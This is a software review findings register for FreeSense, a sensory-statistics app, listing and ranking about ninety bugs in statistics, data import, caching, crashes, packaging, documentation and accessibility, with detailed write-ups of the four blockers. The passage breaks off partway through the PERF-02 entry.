# 01 Findings register

FreeSense pre-release review at commit `bcaf9f8` (`main`), 2026-09-26. This register consolidates the ten area reports in this folder (`B01` to `B10`) after an independent challenge pass. Codebase map and test/lint baseline: `00-orientation.md`. Owner decisions: `02-decisions.md`. Staged plan: `03-implementation-plan.md`.

## How this register was built

1. **Area reviews.** Ten reviewers (B01 statistics to B10 interface) each wrote a report using the prompt's finding format. Every BLOCKER and HIGH finding cites a reproduction (script, AppTest run or command), and the scripts are kept in the session scratchpad under `agents/B<nn>/`.
2. **Challenge pass.** Three fresh agents that had not seen the reviewers' reasoning were given only the title, location and evidence of every BLOCKER and HIGH finding (24 findings) and asked to reproduce or refute each one with their own code:
   - Pass A: 12 statistics, workflow and import findings. 11 reproduced, 1 partly reproduced (IO-02), 0 refuted.
   - Pass B: 10 testing, security, packaging and documentation findings. 9 reproduced (legal findings: facts only), 1 partly reproduced (DOC-02), 0 refuted.
   - Pass C: the 2 performance BLOCKERs. Both reproduced in the real app.

   **No BLOCKER or HIGH finding was removed.** The two partly reproduced findings keep their surviving parts; the part that failed is stated in their status line.
3. **Severity after challenge.** The challengers recommended severities against the prompt's definitions. I (lead reviewer) accepted most of them and overrode four, with the reason recorded in the status line:
   - Kept HIGH against a MEDIUM recommendation: **STAT-01** (★ significance marks on pure noise with no caveat), **STAT-02** (wrong df; Hedges' g collapses to 0 for small panels), **TEST-02** (B01's statistical defects sit exactly in the paths that lack known-answer tests).
   - Raised MEDIUM to HIGH: **STAT-05** (the segmentation step crashes when any consumer gives every product the same score; pass A reproduced it independently, and straight-lining consumers are common in real data).
   - Downgraded HIGH to MEDIUM on the challengers' recommendation: STAT-03, IO-06, TEST-01, SEC-01 (HIGH if hosted), REL-03 (a licensing decision, D-04), DOC-02.
   - Raised to BLOCKER: FUNC-04, then merged into IO-01 (same root cause).
4. **Deduplication.** 14 findings were merged into the finding with the strongest evidence. They are listed at the end of section 1 and their original text stays in section 2 for traceability.
5. **Conditional severities.** Several findings depend on the deployment decision (D-02). They are shown as, for example, "MEDIUM (HIGH if hosted)", and the plan treats them at the lower severity until D-02 is decided.

## Counts

| Severity | Before challenge (105 findings as filed) | After challenge and consolidation (91 distinct findings) |
|---|---|---|
| BLOCKER | 4 | 4 |
| HIGH | 20 | 12 |
| MEDIUM | 47 | 46 |
| LOW | 34 | 29 |
| Merged into another finding | n/a | 14 |

**Added after the review.** STAT-13 was found on 2026-09-27, when the first CI run (Stage 1) failed. It is not included in the counts above, so there are now 92 distinct findings, 13 of them HIGH.

Conditional: SEC-04 becomes a BLOCKER before the repository or its history is made public. PERF-04, SEC-01 and SEC-05 become HIGH if the app is hosted.

## The four BLOCKERs in one paragraph

All four are silent-wrong-result or crash defects with small fixes:
- **FUNC-01:** Liking LS means are wrong when a product name contains "Var" or "Cov", because parameters are selected by substring.
- **IO-01:** empty rows or blank ID cells become a real product or assessor called "nan". This silently changes DA results and crashes RATA.
- **PERF-01:** Streamlit hashes DataFrames of 50,000 or more rows by sampling 10,000 of them, so a corrected re-upload of a large study can silently return the old statistics.
- **PERF-02:** the optional pingouin ICC confidence-interval block crashes DA on small but valid designs.

None needs more than a day's work including tests.


## 1. Consolidated table

Sorted by final severity. "Orig." is the severity the area reviewer gave; "Final" is after the challenge pass and consolidation. Effort: S under 2 h, M half a day to 2 days, L more than 2 days.

| ID | Title | Area | Final | Orig. | Confidence | Effort | Status after challenge |
|---|---|---|---|---|---|---|---|
| FUNC-01 | Liking LS means silently wrong when a product name contains "Var" or "Cov" | B02 Workflow | **BLOCKER** | BLOCKER | VERIFIED | S | Challenge: reproduced (pass A) |
| IO-01 | Trailing empty rows create a phantom product "nan"; DA silently changes results, RATA crashes | B03 Import/export | **BLOCKER** | BLOCKER | VERIFIED | S | Challenge: reproduced (pass A); absorbs FUNC-04 |
| PERF-01 | Cached statistics return stale results after a corrected re-upload of any study with 50,000 or more long-format rows | B06 Performance | **BLOCKER** | BLOCKER | VERIFIED | S | Challenge: reproduced (pass C); narrow trigger (>= 50,000 long rows), silent, cheap fix |
| PERF-02 | DA "Run full analysis" crashes when any assessor x attribute has fewer than 5 ratings (2 products x 2 sessions, or 3 x 2 with one missed product) | B06 Performance | **BLOCKER** | BLOCKER | VERIFIED | S | Challenge: reproduced (pass C) |
| STAT-01 | Cluster ANOVA tests the partition it was built from, so "significant" stars appear on pure noise | B01 Statistics | **HIGH** | HIGH | VERIFIED | S | Challenge: reproduced (pass A); challenger suggested MEDIUM; kept HIGH by lead: ★ significance on pure noise, no caveat |
| STAT-02 | Liking contrast uses df = n_consumers - n_products, disagreeing with the CLD and with the correct RCBD df | B01 Statistics | **HIGH** | HIGH | VERIFIED | M | Challenge: reproduced (pass A); challenger suggested MEDIUM (HIGH for panels under about 30); kept HIGH by lead: wrong df and Hedges' g of 0 at small n |
| STAT-04 | PLS CV Q² collapses when a predictor is constant inside a training fold (in-fold scaling divides by ~1e-17) | B01 Statistics | **HIGH** | HIGH | VERIFIED | S | Challenge: reproduced (pass A); beta module |
| STAT-05 | Consumer segmentation with "standardise" on crashes when any consumer rates every product the same | B01 Statistics | **HIGH** | MEDIUM | VERIFIED | S | Raised MEDIUM to HIGH by lead: independently reproduced by pass A; straight-lining consumers are common, the step crashes |
| FUNC-02 | DA crashes with a raw traceback when no attribute column is numeric (for example decimal-comma CSV) | B02 Workflow | **HIGH** | HIGH | VERIFIED | S | Challenge: reproduced (pass A) |
| FUNC-03 | Duplicated rows silently change DA results | B02 Workflow | **HIGH** | HIGH | VERIFIED | S | Challenge: reproduced (pass A) |
| STAT-13 | DA empty-cell ANOVA takes its residual and interaction SS from a rank-deficient `statsmodels` OLS fit, so F and p are slightly wrong and differ between machines | Stage 1 CI (added 2026-09-27) | **HIGH** | n/a | VERIFIED | S | Found after the review, when the first CI run failed on Linux 3.12; not challenged. **Fixed in Stage 1** (2026-09-27) |
| FUNC-05 | File reading is brittle and failures are silent or unintelligible (delimiter, decimal comma, encoding, .xls, .CSV) | B02 Workflow | **HIGH** | HIGH | VERIFIED | S | Challenge: reproduced (pass A); absorbs IO-03, IO-04 |
| IO-02 | Decimal-comma numbers are silently zero-filled (RATA), dropped (DA) or dropped as whole columns (means tables) | B03 Import/export | **HIGH** | HIGH | VERIFIED | M | Challenge: partly reproduced (pass A): a mixed decimal-comma column in a means table does warn, but blames missing values; rest holds. Absorbs FUNC-06 |
| TEST-02 | Nearly half the shipped statistical methods have no known-answer test | B05 Testing | **HIGH** | HIGH | VERIFIED | M | Challenge: reproduced (pass B); challenger suggested MEDIUM; kept HIGH by lead: B01 found defects (STAT-01/02/03/04) precisely in untested paths |
| SEC-04 | Third-party proprietary files are in the git history (XLSTAT tutorial workbook with macros, training slides, a PDF) | B07 Security/privacy | **HIGH (BLOCKER if made public)** | HIGH | VERIFIED | S | Challenge: reproduced (pass B, facts); BLOCKER before the repository or its history is made public (D-03); absorbs REL-02 |
| REL-01 | The GitHub repository is private, so README's clone command and citation URL fail for every user | B08 Packaging/licensing | **HIGH** | HIGH | VERIFIED | S | Challenge: reproduced (pass B) |
| DOC-01 | Statistical methods reference contradicts the implemented code in places a user would copy into a methods section | B09 Documentation | **HIGH** | HIGH | VERIFIED | M | Challenge: reproduced (pass B): 10 of 10 contradictions hold (item 6 weak) |
| STAT-03 | RATA Tukey contrast uses a different error term from the RATA Tukey CLD | B01 Statistics | **MEDIUM** | HIGH | VERIFIED | S | Challenge: reproduced (pass A); downgraded HIGH to MEDIUM: the CLD (primary output) is correct, the contrast view disagrees on 16/420 pairs |
| STAT-06 | DA with a replicate column that has a single session: every attribute ends in an error row | B01 Statistics | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| STAT-08 | MDPREF silently mean-imputes missing consumer x product cells | B01 Statistics | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| FUNC-07 | The shipped PrefMap consumer file cannot be used by PrefMap, and the error does not explain why | B02 Workflow | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| FUNC-08 | After switching modules, the uploaded file is gone from Step 1 although results remain, and changing any setting forces a full re-upload | B02 Workflow | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| FUNC-09 | Browser refresh or a dropped connection loses all work with no warning | B02 Workflow | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| IO-05 | Multi-sheet workbooks: the first sheet is read silently and the user cannot choose | B03 Import/export | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| IO-06 | `Run_Parameters` cannot reproduce a run: no date, dependency versions, commit, bootstrap settings or file fingerprint; the version stamp "1.0.0" is ambiguous | B03 Import/export | **MEDIUM** | HIGH | VERIFIED | S | Challenge: reproduced (pass A); downgraded HIGH to MEDIUM: audit gap, cannot corrupt a result |
| IO-08 | Export precision and typing are inconsistent: many values rounded to 3 dp, rates stored as text | B03 Import/export | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| IO-09 | Word/PowerPoint image exports: text becomes very small at page size | B03 Import/export | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| IO-11 | kaleido 0.2.1 pin is a deployment and upgrade risk | B03 Import/export | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| CODE-01 | Liking's Tukey label is not recognised by the spider plot, so an HSD ribbon is captioned "±LSD zone" | B04 Code | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-02 | Global `uploaded_file` key leaks between modules and puts the wrong file name in Fusion/PrefMap `Run_Parameters` | B04 Code | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-03 | Liking LMM never raises its convergence warning on a successful fit; optimiser fallback and boundary fits are silent | B04 Code | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-04 | Stats-layer warnings reach only the terminal; the Fusion permutation caption reports the requested, not the used, permutation count | B04 Code | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| TEST-01 | The suite protects results only on the maintainer's machine: no CI, no lockfile, one Python version | B05 Testing | **MEDIUM** | HIGH | VERIFIED | S | Challenge: reproduced (pass B, facts); downgraded HIGH to MEDIUM: drift in pinned numbers could not be demonstrated |
| TEST-03 | The CATA McNemar pin checks p-values for only 38 of 465 pairs, and never the adjusted p-values | B05 Testing | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| TEST-04 | Pin tolerances are several orders looser than the agreement achieved, partly because the stats layer rounds test statistics | B05 Testing | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| TEST-05 | The R references are real R output, but several are R re-implementations of FreeSense's own algorithm, and none has been regenerated since July | B05 Testing | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| TEST-06 | Whole user-reachable paths are never executed by any test, including the precomputed-means loader | B05 Testing | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| TEST-07 | AppTests check wiring and conventions well, but bypass real upload and never check numbers on screen | B05 Testing | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| PERF-03 | DA and RATA run times are dominated by two avoidable costs (pingouin CI loop; per-pair numerical-integration Tukey p-values) | B06 Performance | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| PERF-04 | No resource limits for a hosted deployment: default 200 MB upload, no size caps, GIL-bound compute in one process, small shared caches | B06 Performance | **MEDIUM (HIGH if hosted)** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| PERF-05 | Long runs cannot be cancelled, DA's progress display is fake, and touching a widget mid-run discards the run | B06 Performance | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| PERF-06 | DA "Run" crashes for a single-attribute dataset | B06 Performance | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| SEC-01 | Excel exports write any text beginning with "=" as a live formula (formula injection) | B07 Security/privacy | **MEDIUM (HIGH if hosted)** | HIGH | VERIFIED | S | Challenge: reproduced (pass B); downgraded HIGH to MEDIUM for local use; HIGH if hosted or fed third-party free text (D-02) |
| SEC-03 | Local install listens on every network interface and phones checkip.amazonaws.com at start | B07 Security/privacy | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| SEC-05 | No privacy or data-handling statement; personal data is held in shared server memory with no expiry | B07 Security/privacy | **MEDIUM (HIGH if hosted)** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| REL-03 | pingouin (GPL-3.0) is installed by default and imported by the MIT-licensed app; licence position undocumented | B08 Packaging/licensing | **MEDIUM** | HIGH | VERIFIED | S | Challenge: reproduced (pass B, facts); downgraded to MEDIUM: licensing decision D-04, not a defect |
| REL-04 | No lockfile; every fresh install resolves different versions, including release-candidate `wrapt` | B08 Packaging/licensing | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| REL-05 | Version string, tag and changelog disagree; `v1.0.0` tag is local only | B08 Packaging/licensing | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| REL-06 | Python support claim untested; `pyproject` ruff target contradicts the dependency floor; dev tools mixed into runtime requirements | B08 Packaging/licensing | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| DOC-02 | No ready-to-use methods text or per-module citation, and exports do not carry what a methods section needs | B09 Documentation | **MEDIUM** | HIGH | VERIFIED | M | Challenge: partly reproduced (pass B): Fusion does write an Analysis_Info sheet; downgraded HIGH to MEDIUM |
| DOC-03 | The interaction pre-test alpha is documented as not affecting product p-values; it does | B09 Documentation | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| DOC-04 | README user guide is out of date with the code in several module sections | B09 Documentation | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| DOC-05 | In-app help text mislabels the DA model and misdescribes the post-hoc options | B09 Documentation | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| DOC-06 | Data-format documentation does not let a new user format every module's file, and two shipped examples do not load where the docs say they should | B09 Documentation | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| UI-01 | Opening About or the methods reference silently resets the colour scheme and export format | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-02 | Significant rows in the Liking penalty table are near-invisible on the dark theme, and greyed rows fail contrast on light | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-03 | The brand teal fails WCAG AA contrast for text on primary buttons | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-04 | The preference-surface guide says "green = high, red = low", but the colour-blind palette makes red mean high | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-05 | Semantic red/green colours ignore the colour-blind setting, and some carry meaning by colour alone | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| UI-06 | The "Colour-blind safe" product palette includes a yellow that almost disappears on white, and the default palette has a deuteranopia-confusable pair | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-07 | The DA discrimination heatmap is empty for designs without replicates and always states α = 0.05 | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-08 | The only help or feedback route is the README; the Streamlit menu is left unconfigured | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-09 | The in-app About page is the developer README: 7 broken links, developer-only content, and step names that do not match the app | B10 Interface | **MEDIUM** | MEDIUM | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| STAT-09 | Tukey "fallback" to uncorrected paired t-tests is described as conservative | B01 Statistics | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| STAT-11 | Kendall's W UI caption says ties are not corrected, while the code applies the tie correction | B01 Statistics | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| FUNC-10 | DA/RATA default scale 0 to 100 is accepted silently for 0 to 10 data | B02 Workflow | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| FUNC-11 | Gating messages reference step names and actions that do not exist | B02 Workflow | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| FUNC-12 | The bundled CATA example opens with a red error | B02 Workflow | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| IO-12 | Browser modebar download: fixed 1200×800 at scale 2 and a generic file name | B03 Import/export | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-05 | A few broad `except Exception` blocks silently drop a result in UI paths | B04 Code | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-06 | Lint backlog is cosmetic, but E712 must not be auto-fixed, and the project claims no linter is configured | B04 Code | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-07 | Parallel copies of the contrast step, ideal-point overlay and confidence ellipse | B04 Code | **LOW** | LOW | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| CODE-08 | About 380 lines of dead functions and two obsolete scipy version probes | B04 Code | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-09 | Layer-rule test covers one file; a few statistics still live in `modules/` and `utils/` | B04 Code | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| CODE-10 | Pandas `DataFrameGroupBy.apply` FutureWarning in panel performance | B04 Code | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| TEST-08 | 94 tests (26%) skip without `example_data/`, and the skips are not reported by default | B05 Testing | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| PERF-07 | `render_chart` docstring misdescribes kaleido behaviour | B06 Performance | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| SEC-06 | Full Python tracebacks are shown to end users | B07 Security/privacy | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| SEC-07 | Uploaded column names are interpolated into st.markdown | B07 Security/privacy | **LOW** | LOW | SUSPECTED | S | Not challenged (MEDIUM/LOW) |
| SEC-08 | Repository history hygiene: home paths, private dataset names, dangling tracked symlink | B07 Security/privacy | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| REL-07 | No project metadata; no bug-report route | B08 Packaging/licensing | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| REL-08 | Example datasets: GPL notice present, but no copy of the GPL text is shipped | B08 Packaging/licensing | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| REL-09 | kaleido 0.2.1 / plotly 5 pins will age out; ceilings exclude current major releases | B08 Packaging/licensing | **LOW** | LOW | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| REL-10 | No citation metadata for academic users | B08 Packaging/licensing | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| REL-11 | No deployment artefacts for any channel | B08 Packaging/licensing | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| DOC-07 | Methods reference structure: TOC out of sync, broken in-app anchors, stale identifiers, internal jargon | B09 Documentation | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| DOC-10 | stats/ docstrings are nearly complete; a few are stale or incomplete | B09 Documentation | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-10 | Wrong step numbers in three user-facing cross-references | B10 Interface | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-11 | Charts have no text equivalent in some mapping steps, so screen-reader users get nothing | B10 Interface | **LOW** | LOW | VERIFIED | M | Not challenged (MEDIUM/LOW) |
| UI-12 | The landing page loses its grouping on narrow screens | B10 Interface | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-13 | Colour-scheme changes apply to some charts immediately and to others only after a re-run | B10 Interface | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |
| UI-14 | The cluster-size KPI uses the metric delta for a share, which renders as a green "increase" | B10 Interface | **LOW** | LOW | VERIFIED | S | Not challenged (MEDIUM/LOW) |

### Merged findings (fixed together with the finding they merged into; original text kept at the end of section 2)

| ID | Title | Merged into |
|---|---|---|
| STAT-07 | Liking LMM never checks `.converged`; the convergence warning can only fire when every optimiser raises | CODE-03 |
| STAT-10 | DA docstring says the interaction pre-test alpha has no effect on product p-values | DOC-03 |
| STAT-12 | Liking Tukey ribbon labelled "±LSD zone" | CODE-01 |
| FUNC-04 | Blank product (or assessor) cells become a real level called "nan"; RATA crashes | IO-01 |
| FUNC-06 | Non-numeric cells are reported as "blank", and wrong advice is given for decimal-comma columns | IO-02 |
| IO-03 | European CSVs (semicolon delimiter, Windows-1252/Latin-1 encoding) are rejected with raw parser messages | FUNC-05 |
| IO-04 | `.xls` is offered by the uploader but cannot be read (xlrd not a dependency); uppercase `.CSV` fails | FUNC-05 |
| IO-07 | Exported `data_source_file` can name a different module's file (Fusion, PrefMap; suspected for DA/RATA/CATA) | CODE-02 |
| IO-10 | Default palettes and fixed semantic colours are not colour-blind safe or greyscale-distinguishable | UI-06 |
| SEC-02 | No upload size cap and no decompression guard; a 0.3 MB workbook costs 46 s and 475 MB | PERF-04 |
| REL-02 | Git history contains third-party copyrighted files; making the repo public as-is would redistribute them | SEC-04 |
| REL-12 | Broken `.claude/skills` symlink tracked in git | SEC-08 |
| DOC-08 | In-app About and Methods overlays: developer content, dead relative links, no search in a 257 KB page | UI-09 |
| DOC-09 | Version and status claims in documents are inconsistent | REL-05 |

## 2. Full findings, ordered by final severity

Text is as written by the area reviewer (reports `B01` to `B10`), with a `Register status` line added. Where the final severity differs from the reviewer's `Severity` line, the register status line is authoritative.


## BLOCKER

### FUNC-01: Liking LS means silently wrong when a product name contains "Var" or "Cov"
- **Register status: final severity BLOCKER. Challenge: reproduced (pass A).** (source: `B02-functional-workflow.md`)
- Severity: BLOCKER
- Confidence: VERIFIED
- Location: `stats/liking.py:258-261` (`compute_liking_lmm`)
- Evidence: fixed-effect parameters are selected with `if 'Var' not in p and 'Cov' not in p`. The parameter names include the product label (`C(_product)[T.Variety A]`), so a product whose name contains "Var" or "Cov" is dropped from the fixed-effect design matrix and gets the intercept (the reference product's mean) as its LS mean. Reproduction: `scratchpad/agents/B02/liking_var.py` renames hedochoc `choc1..6` to `Variety A, Variety B, Covent, Plain, Dark, Milk`:
  ```
  product   ls_mean   (raw mean)
  Covent    5.765766  5.765766
  Variety A 5.765766  5.328829   <- wrong, equals the reference
  Variety B 5.765766  5.689189   <- wrong
  ```
  The same data with names `choc1..6` gives the correct 5.3288 / 5.6892. `cov_lsmeans` is built from the same matrix, so standard errors, CLD letters and contrasts that consume it are also wrong. The UI path (Liking Step 1 "Run full analysis") calls this function (`run_liking.py`, `variety.csv`, ran with no warning). No error or warning is shown.
- Impact: any consumer study with a product called "Variety ...", "Varietal", "Covent ...", "Cover", "Vareniki" and so on gets wrong hedonic means, wrong letters and wrong contrasts, with no signal. Plausible product names in food and beverage work.
- Recommendation: select fixed effects by position or with `result.fe_params.index` (statsmodels exposes it) instead of substring matching; add a regression test with product names containing "Var" and "Cov".
- Effort: S
- Dependencies: none

### IO-01: Trailing empty rows create a phantom product "nan"; DA silently changes results, RATA crashes
- **Register status: final severity BLOCKER. Challenge: reproduced (pass A); absorbs FUNC-04.** (source: `B03-import-export.md`)
- Severity: BLOCKER
- Confidence: VERIFIED
- Location: `core/data.py:17-37` (`load_data`, no empty-row drop), `core/data.py:193-195` (`astype(str)` turns NaN into the string `'nan'`), `core/data.py:214` (RATA zero-fill); RATA `modules/rata/ui.py:427` -> `stats/mixed_models.py:60`
- Evidence: sensochoc exported to CSV plus two lines of only commas (the usual artefact of deleted rows in Excel). `load_data` returns 350 rows, the last two all-NaN. After `clean_and_structure_data` both DA and RATA carry a product `'nan'`, assessor `'nan'` and replicate `'nan'`.
  - DA (AppTest): no error. The only message is "28 blank cells detected". Step 1 metrics say Products 6 / Assessors 29, but `da_df_long` has products `[choc1..choc6, 'nan']` and 30 assessors. `'nan'` shows up in `da_summary_df`, `da_cld_df` (for example `MilkF nan abcde`), `da_rv_df` (30 assessors) and the Raw_Data export. Direct comparison (`da_cld.py`) against the clean file shows **3 CLD pairwise verdicts among the real products change**: Bitterness choc4 vs choc6 and Sweetness choc2 vs choc6 go from different to not different. Panel-performance frames (`da_agree_df`, `da_scale_df`, `da_rv_df`) also differ.
  - RATA (AppTest): the zero-filled `'nan'` product passes validation. It shows only an "Unbalanced design (Min: 1, Max: 29)" warning and Products 7. "Run full analysis" then raises an uncaught `patsy.PatsyError: factor contains missing values` from `run_mixed_models`. The user sees a traceback.
  - An xlsx whose stray cell holds a space, or a formatted row further down, gives the same NaN rows (`fmt2.py`, `trail.xlsx`: 7 rows for 2 data rows, plus `Unnamed: 3/4` columns).
- Impact: a very common file artefact silently changes DA post-hoc groupings and panel-performance figures, and crashes RATA. Unnamed empty columns also become attributes: all-zero in RATA, all-NaN in DA.
- Recommendation: in `load_data`, `dropna(how='all')` on rows and columns and drop `Unnamed: n` columns that are entirely empty, and report the count. In `clean_and_structure_data`, reject (raise) rows where any mapped meta column is NaN before the `str` cast, and never let the literal string `'nan'` become a level. Add a regression test using sensochoc plus trailing blank rows.
- Effort: S
- Dependencies: none

### PERF-01: Cached statistics return stale results after a corrected re-upload of any study with 50,000 or more long-format rows
- **Register status: final severity BLOCKER. Challenge: reproduced (pass C); narrow trigger (>= 50,000 long rows), silent, cheap fix.** (source: `B06-performance.md`)
- Severity: BLOCKER
- Confidence: VERIFIED
- Location: every `@st.cache_data` function that takes `df_long` (for example `stats/shared/frequency.py` `build_citation_matrix`, `run_cochrans_q`, `run_mcnemar_posthoc`; `stats/descriptive.py`; `stats/da_anova.run_da_anova`; `stats/mixed_models.run_mixed_models`; `stats/posthoc.generate_cld`; `stats/panel_performance.*`; `stats/multivariate.run_cva` / `calculate_panel_stability`; `stats/cata.compute_ca_ellipses`; `stats/liking.compute_liking_lmm`). The mechanism is Streamlit's hasher, `env/lib/python3.14/site-packages/streamlit/runtime/caching/hashing.py:52-54,519-533`.
- Evidence: Streamlit hashes a DataFrame of 50,000 rows or more by taking a random sample of 10,000 rows with a fixed seed (`runner.cacheHashSeed`, default 0) and hashing that sample plus the frame's shape. A change outside the sampled rows gives the same cache key, so the cached result is returned. `load_data` hashes the full upload bytes and `clean_and_structure_data` gets the small wide frame, so these two recompute. Every downstream function receives the long frame, which is over 50,000 rows for realistic studies: 150 consumers x 8 products x 50 attributes is 60,000 rows, and the RATA and DA stress sizes above are 96,000 and 120,000.
  - Stats level (`hash_collision.py`, `hash_collision_cata.py`): in a 50,000-row CATA frame I flipped 20 ticks of P02/Attr003 outside the sample. `build_citation_matrix` still returned 0.06 against a true 0.26. `run_cochrans_q` returned Q = 128.66, p = 2.2e-23, against a true Q = 98.11, p = 3.8e-17. The DA descriptives showed the same behaviour: a cached mean of 5.207 against a true 5.116.
  - End to end in the real app (`apptest_stale.py`): one AppTest session ran CATA on a 150 x 8 x 50 file. A second session in the same server process, representing the user reloading the page and uploading a corrected file with 25 cells fixed, ran again. Output: `P02/Attr003 citation rate shown after corrected upload: 0.427; correct: 0.593` and `Cochran's Q Attr003 shown: 124.41; correct: 151.89`. There was no warning, and the new file really was different (`raw data differ: True`).
  - For a single changed cell, the chance of falling outside the sample is 1 - 10,000/n: 83% at 60,000 rows and 90% at 100,000. The cache is process-wide, so the stale entry is also served to any other session whose data differs only outside the sample.
- Impact: the typical correct-and-rerun workflow can silently show the old numbers: frequency tables, Cochran's Q, ANOVA, LMM, CLD letters and panel performance. They then go into the Excel export. This affects CATA consumer studies of ordinary size (100 or more consumers with 50 or more attributes, or several products) and any large DA or RATA panel.
- Recommendation: stop letting Streamlit sample. Two options:
  - Pass `hash_funcs={pd.DataFrame: _full_frame_digest}` to every `st.cache_data` in `stats/` and `core/data.py`, where `_full_frame_digest` returns `pd.util.hash_pandas_object(df, index=True).values.tobytes()` plus the column names and dtypes. That is about 50 ms per million rows. A shared decorator (`core/cache.py::cache_stats = functools.partial(st.cache_data, max_entries=8, hash_funcs=...)`) keeps it in one place.
  - Or compute a content digest once in the Run handler and pass it as an explicit argument, with `_df_long` underscore-prefixed so Streamlit does not hash it.
  - Add a regression test that runs a cached function on a 60,000-row frame, changes one row outside the sample, and asserts that the result changes.
- Effort: S
- Dependencies: none

### PERF-02: DA "Run full analysis" crashes when any assessor x attribute has fewer than 5 ratings (2 products x 2 sessions, or 3 x 2 with one missed product)
- **Register status: final severity BLOCKER. Challenge: reproduced (pass C).** (source: `B06-performance.md`)
- Severity: BLOCKER
- Confidence: VERIFIED
- Location: `stats/panel_performance.py:251-264` (`compute_repeatability`, the optional pingouin CI block), called from `modules/descriptive/workflow.py:74`.
- Evidence: `pg.intraclass_corr` asserts "Data must have at least 5 non-missing values". The surrounding `except` catches `(LinAlgError, ValueError, RuntimeError, KeyError, IndexError)` but not `AssertionError`, and the outer `except` at line 266 does not catch it either, so it propagates out of `run_full_da_analysis`.
